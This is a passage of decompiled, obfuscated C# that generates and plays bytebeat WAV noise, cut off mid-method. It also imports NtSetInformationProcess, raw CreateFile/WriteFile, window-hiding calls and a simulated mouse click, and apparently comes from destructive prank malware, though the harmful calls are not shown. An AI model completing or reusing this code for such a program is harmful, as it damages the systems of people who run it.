using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

// Token: 0x0200000D RID: 13
internal static class Class6
{
	// Token: 0x06000059 RID: 89
	[DllImport("user32.dll")]
	private static extern bool SetWindowText(IntPtr A_0, string A_1);

	// Token: 0x0600005A RID: 90
	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	// Token: 0x0600005B RID: 91
	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool MoveWindow(IntPtr A_0, int A_1, int A_2, int A_3, int A_4, bool A_5);

	// Token: 0x0600005C RID: 92
	[DllImport("user32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	public static extern void mouse_event(uint A_0, uint A_1, uint A_2, uint A_3, uint A_4);

	// Token: 0x0600005D RID: 93 RVA: 0x00003950 File Offset: 0x00001B50
	public static void StaticMethod0()
	{
		uint x = (uint)Class6.StaticMethod22().X;
		uint y = (uint)Cursor.Position.Y;
		Class6.mouse_event(24U, x, y, 0U, 0U);
	}

	// Token: 0x0600005E RID: 94
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr A_0, int A_1, ref int A_2, int A_3);

	// Token: 0x0600005F RID: 95
	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string A_0, uint A_1, uint A_2, IntPtr A_3, uint A_4, uint A_5, IntPtr A_6);

	// Token: 0x06000060 RID: 96
	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr A_0, byte[] A_1, uint A_2, out uint A_3, IntPtr A_4);

	// Token: 0x06000061 RID: 97
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int FindWindow(string A_0, string A_1);

	// Token: 0x06000062 RID: 98
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern bool ShowWindow(int A_0, int A_1);

	// Token: 0x06000063 RID: 99 RVA: 0x00003984 File Offset: 0x00001B84
	[STAThread]
	private static void StaticMethod1(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(~i * (~i >> 9 | ~i >> 11));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00003AFC File Offset: 0x00001CFC
	private static void StaticMethod2(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 8; i < array.Length; i++)
			{
				array[i] = (byte)(i * (i >> i | i >> 8));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000065 RID: 101 RVA: 0x00003C74 File Offset: 0x00001E74
	private static void StaticMethod3(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 8; i < array.Length; i++)
			{
				array[i] = (byte)(i * (322376503 >> (i & i >> 10)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00003DF0 File Offset: 0x00001FF0
	private static void StaticMethod4(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			Random a_2 = Class6.StaticMethod37();
			int num3 = Class6.StaticMethod38(a_2, 5, 8);
			int num4 = Class6.StaticMethod38(a_2, 9, 11);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * i >> (i >> num3 & i >> num4));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_3 in array)
			{
				Class6.StaticMethod29(a_, a_3);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00003F8C File Offset: 0x0000218C
	private static void StaticMethod5(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * (i >> (i & i >> 10)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000068 RID: 104 RVA: 0x00004104 File Offset: 0x00002304
	private static void StaticMethod6(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)((i & i + i / 256) * i >> 4);
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000069 RID: 105 RVA: 0x00004280 File Offset: 0x00002480
	private static void StaticMethod7(int A_0, int A_1)
	{
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * (i >> 8 & i >> (i ^ i >> 8)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x000043FC File Offset: 0x000025FC
	private static void StaticMethod8(int A_0, int A_1)
	{
		Random a_ = Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_2 = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_2, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_2, 0U);
			Class6.StaticMethod26(a_2, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_2, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_2, 16U);
			Class6.StaticMethod28(a_2, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_2, 1);
			Class6.StaticMethod27(a_2, (uint)A_0);
			Class6.StaticMethod27(a_2, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_2, 1);
			Class6.StaticMethod28(a_2, 8);
			Class6.StaticMethod26(a_2, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			Class6.StaticMethod38(a_, 42, 44);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * ((i >> 10) + (2 & i >> 15)) >> (3 & i >> 10));
			}
			Class6.StaticMethod27(a_2, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_3 in array)
			{
				Class6.StaticMethod29(a_2, a_3);
			}
			Class6.StaticMethod30(a_2, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_2, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_2)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00004594 File Offset: 0x00002794
	private static void StaticMethod9(int A_0, int A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(430 * (10 * i >> 13 | 4 * i >> 3));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00004718 File Offset: 0x00002918
	private static void StaticMethod10(int A_0, int A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			byte[] array = new byte[A_0 * A_1];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(2 * i * (i >> 10) * (4 - (3 & i >> 8)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006D RID: 109 RVA: 0x00004898 File Offset: 0x00002A98
	private static void StaticMethod11(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(2 * i * (i >> 9 | (2 * i ^ 69)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00004A18 File Offset: 0x00002C18
	private static void StaticMethod12(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * ((i >> 11 | i >> 7) & i >> 3) - 128);
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00004BA0 File Offset: 0x00002DA0
	private static void StaticMethod13(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * (i >> 8) * (i & i >> 10));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00004D20 File Offset: 0x00002F20
	private static void StaticMethod14(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)((i & i >> 6) - (i | i >> 8) - (i | i >> 7) * (i | i >> 9));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00004EB0 File Offset: 0x000030B0
	private static void StaticMethod15(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * 10 * (3 * (3 & i >> 3) + (i & i >> 10)));
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00005038 File Offset: 0x00003238
	private static void StaticMethod16(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("WAVE"));
			Class6.StaticMethod26(a_, Class6.StaticMethod25("fmt "));
			Class6.StaticMethod27(a_, 16U);
			Class6.StaticMethod28(a_, 1);
			int num = 1;
			int num2 = 8;
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod27(a_, (uint)A_0);
			Class6.StaticMethod27(a_, (uint)(A_0 * 1 * 8 / 8));
			Class6.StaticMethod28(a_, 1);
			Class6.StaticMethod28(a_, 8);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("data"));
			int num3 = (int)A_1;
			byte[] array = new byte[A_0 * num3];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)(i * i >> (i & i >> 12) * i >> 8);
			}
			Class6.StaticMethod27(a_, (uint)(array.Length * num * num2 / 8));
			foreach (byte a_2 in array)
			{
				Class6.StaticMethod29(a_, a_2);
			}
			Class6.StaticMethod30(a_, 4, SeekOrigin.Begin);
			Class6.StaticMethod27(a_, (uint)(Class6.StaticMethod32(Class6.StaticMethod31(a_)) - 8L));
			Class6.StaticMethod33(memoryStream, 0L, SeekOrigin.Begin);
			Class6.StaticMethod35(Class6.StaticMethod34(memoryStream));
		}
		finally
		{
			if (memoryStream != null)
			{
				Class6.StaticMethod36(memoryStream);
			}
		}
	}

	// Token: 0x06000073 RID: 115 RVA: 0x000051BC File Offset: 0x000033BC
	private static void StaticMethod17(int A_0, double A_1)
	{
		Class6.StaticMethod37();
		MemoryStream memoryStream = Class6.StaticMethod23();
		try
		{
			BinaryWriter a_ = Class6.StaticMethod24(memoryStream);
			Class6.StaticMethod26(a_, Class6.StaticMethod25("RIFF"));
			Class6.StaticMethod27(a_, 0U);
